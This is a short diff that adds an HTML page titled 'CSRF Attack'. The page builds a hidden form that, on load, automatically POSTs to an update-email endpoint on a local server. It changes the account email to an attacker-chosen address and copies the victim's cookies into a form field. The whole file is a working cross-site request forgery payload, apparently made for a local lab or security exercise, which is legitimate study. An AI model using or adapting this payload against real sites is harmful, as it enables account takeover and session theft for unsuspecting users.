@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <form id="csrfForm" action="http://127.0.0.1:8000/update-email/" method="POST">
+        <input type="hidden" name="new_email" value="5bigbooms@boom.com">
+        <input type="hidden" id="session_token" name="session_token" value="">
+    </form>
+    <script>
+        document.getElementById("session_token").value = document.cookie;
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
